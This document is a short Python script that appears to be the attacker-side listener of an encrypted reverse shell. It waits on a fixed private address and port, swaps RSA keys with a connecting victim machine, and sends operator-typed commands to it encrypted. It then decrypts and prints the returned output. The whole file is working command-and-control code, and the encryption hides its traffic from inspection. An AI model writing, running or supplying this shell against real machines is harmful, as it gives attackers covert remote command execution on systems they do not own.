# pylint: disable=bare-except, missing-docstring, import-error, invalid-name
import socket
from cryptidy import asymmetric_encryption as ae

EOF = b'dhruv.anish.samarth.blah.blah'

HOST = '10.0.2.4' # Listen on all network interfaces
PORT = 12345  # Choose a port number
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bound_to_port = False
while not bound_to_port:
    try:
        s.bind((HOST, PORT))
        bound_to_port = True
    except OSError as e:
        pass # ignore err and try again

s.listen(1)
print(f"Listening on {HOST}:{PORT}")
conn, addr = s.accept()
print(f"Connection from {addr}")

priv_key, pub_key = ae.generate_keys(2048)  # 2048 bits RSA key
conn.send(pub_key.encode())

target_pub_key = conn.recv(1024).decode()

while True:
    command = input("Enter command to execute or 'exit' to quit: ")
    if command.lower() == 'exit':
        conn.send('exit'.encode())
        conn.close()
        break
    conn.send(ae.encrypt_message(command, target_pub_key))
    encrypted_output = conn.recv(1024)

    if len(encrypted_output) > 0:
        while encrypted_output[-len(EOF):] != EOF:
            encrypted_output += conn.recv(1024)
        
        encrypted_output = encrypted_output[:-len(EOF)]
        _, output = ae.decrypt_message(encrypted_output, priv_key)
        print(output, end="")
    else:
        print("<no output>\n")
s.close()
